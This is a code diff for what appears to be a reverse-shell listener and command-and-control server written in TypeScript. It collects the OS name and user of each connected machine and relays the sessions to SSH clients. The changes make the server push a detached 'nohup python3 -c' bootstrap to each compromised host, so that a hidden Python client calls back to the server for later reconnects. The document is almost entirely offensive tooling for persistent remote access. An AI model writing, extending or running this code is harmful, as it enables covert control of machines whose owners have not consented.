@@ -31,6 +31,7 @@ const destroySocketSafe = (socket: net.Socket) => {
 function startInfoCollection(socket: net.Socket, info: ConnectionInfo) {
     let isInfo = false;
     let infoBuf = '';
+    info.collectingInfo = true;
     const infoCallback = (data: Buffer) => {
         const str = data.toString();
         if (str.includes('---START_INFO2---')) { infoBuf += str.split('---START_INFO2---')[1]; isInfo = true; }
@@ -41,6 +42,7 @@ function startInfoCollection(socket: net.Socket, info: ConnectionInfo) {
                 if (l.startsWith('PRETTY_NAME=')) info.os = sanitizeInput(l.slice('PRETTY_NAME='.length).replace(/"/g, '').trim());
                 else if (l.startsWith('WHOAMI=')) info.user = sanitizeInput(l.slice('WHOAMI='.length).trim());
             }
+            info.collectingInfo = false;
             socket.off('data', infoCallback);
             refreshAllBottomBars();
             setTimeout(() => {
@@ -90,6 +92,8 @@ function attachSocket(connectionId: string, info: ConnectionInfo, socket: net.So
             data = Buffer.from(cleaned, 'binary');
             if (!data.length) return;
         }
+        // Skip terminal write and forwarding during info collection
+        if (info.collectingInfo) return;
         info.terminal.write(data);
         console.log(`[${connectionId}] ${data.toString('hex')}`);
         activeSSHConnections.forEach((sshConn) => {
@@ -172,9 +176,10 @@ reverseShellServer.on('connection', (socket) => {
         });
 
         // Also try to bootstrap python client in background for future reconnects
+        // Send bootstrap BEFORE tmux attaches (info collection sends tmux attach later)
         const serverIp = (socket.localAddress ?? '127.0.0.1').replace('::ffff:', '');
-        const bootstrapCommand = `python3 -c '${escapedScript}' ${serverIp} ${PORT} &\n`;
-        setTimeout(() => socket.write(bootstrapCommand), 1000);
+        const bootstrapCommand = `nohup python3 -c '${escapedScript}' ${serverIp} ${PORT} </dev/null >/dev/null 2>&1 &\n`;
+        socket.write(bootstrapCommand);
 
         // Replay buffered data
         if (headerBuf.length) socket.emit('data', headerBuf);
